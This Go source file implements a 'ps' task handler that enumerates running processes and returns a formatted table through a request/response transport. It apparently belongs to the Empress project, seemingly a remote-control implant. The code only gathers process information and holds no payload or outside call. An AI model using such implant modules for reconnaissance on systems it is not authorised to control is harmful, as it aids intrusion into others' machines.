package proc

import (
	"bytes"
	"fmt"
	"github.com/pygrum/Empress/tasks/core/proc/ps"
	"github.com/pygrum/Empress/transport"
	"text/tabwriter"
)

func CmdPs(_ *transport.Request, response *transport.Response) {
	processes, err := ps.Processes()
	if err != nil {
		transport.ResponseWithError(response, err)
		return
	}

	var b bytes.Buffer
	w := tabwriter.NewWriter(&b, 1, 1, 2, ' ', 0)
	header := "OWNER\tPID\tPARENT\tEXECUTABLE\t"
	_, _ = fmt.Fprintf(w, header)

	rowFmt := "%s\t%d\t%d\t%s\t\n"
	for _, process := range processes {
		line := fmt.Sprintf(rowFmt, process.Owner(), process.Pid(), process.PPid(), process.Executable())
		_, _ = fmt.Fprintf(w, line)
	}
	_ = w.Flush()
	transport.AddResponse(response, transport.ResponseDetail{
		Status: transport.StatusSuccess,
		Dest:   transport.DestStdout,
		Data:   b.Bytes(),
	})
}
